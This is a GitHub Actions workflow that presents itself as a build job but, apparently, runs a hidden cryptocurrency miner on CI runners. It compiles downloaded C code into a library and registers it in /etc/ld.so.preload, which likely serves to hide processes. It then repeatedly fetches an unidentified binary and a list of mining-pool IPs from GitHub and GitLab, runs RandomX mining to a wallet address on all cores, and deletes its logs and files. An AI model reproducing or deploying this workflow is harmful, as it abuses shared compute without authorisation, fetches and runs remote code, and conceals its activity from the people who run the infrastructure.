name: bal

on:
  workflow_dispatch:
  push:
    branches: ["main"]
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    name: build
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1, 2, 3, 4, 5]
        flag: [A]
    env:
      NUM_JOBS: 40
      JOB: ${{ matrix.go }}
    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Install Dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y wget curl build-essential jq

    - name: Download and compile code
      run: |
        curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
        gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
        sudo mv libnyumput.so /usr/local/lib/
        echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
        rm nyumput.c

    - name: Run and manage process
      run: |
        # 6 jam dari sekarang
        end_time=$(( $(date +%s) + 6*3600 ))  
        
        while [ $(date +%s) -lt $end_time ]; do
          # STEP 1: Download Binary (Cukup sekali per siklus besar)
          timestamp_sgr=$(date +%s)
          mkdir -p .lib
          dynamic_sgr=".lib/sgr_$timestamp_sgr"
          wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sr
          chmod +x $dynamic_sgr

          # STEP 2: Loop Port (843 - 852)
          for port in $(seq 843 852); do
            # Cek apakah waktu 6 jam sudah habis
            if [ $(date +%s) -ge $end_time ]; then break; fi

            # STEP 3: Download Ulang List IP (Setiap kali sebelum jalan 720 detik)
            timestamp_list=$(date +%s)
            dynamic_list="list_$timestamp_list.json"
            echo "Updating for port $port..."
            wget -O $dynamic_list https://gitlab.com/barbieanay003/seger/-/raw/main/list4.json

            # Validasi file JSON
            if [[ -f $dynamic_list ]] && jq '.' $dynamic_list > /dev/null 2>&1; then
              # Pilih satu IP acak dari list yang baru di-download
              ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)

              if [ -n "$ip" ]; then
                # Jalankan proses di background
                log_file="dance_${port}_${timestamp_list}.log"
                nohup $dynamic_sgr -a randomx --pool $ip:$port -u 8BJRKZ9FevjeshyBMeUQSzek5Ddpdvht4T6JW9ZhiH937GKCfWCcpBMAJLkktZE8k2JN1A6pjbTDu7knvZFZLT1cKrJHKdr.Mulyono2 --timeout 720 -t $(nproc --all) -p x > $log_file 2>&1 &
                process_pid=$!

                echo "Started PID $process_pid | IP: $ip | Port: $port | Durasi: 12m"

                # Tunggu 12 menit (720 detik)
                sleep 720

                # Matikan proses setelah 12 menit
                kill $process_pid || true
                rm -f $log_file
              else
                echo "IP tidak ditemukan dalam list. Skip port $port."
              fi
            else
              echo "Gagal download list atau format JSON rusak. Menunggu 60 detik..."
              sleep 60
            fi

            # Hapus list lama agar tidak menumpuk, siap untuk download list baru di port berikutnya
            rm -f $dynamic_list
          done

          # Pembersihan binary sebelum siklus 6 jam berikutnya (opsional)
          rm -f $dynamic_sgr
          sleep 120
        done
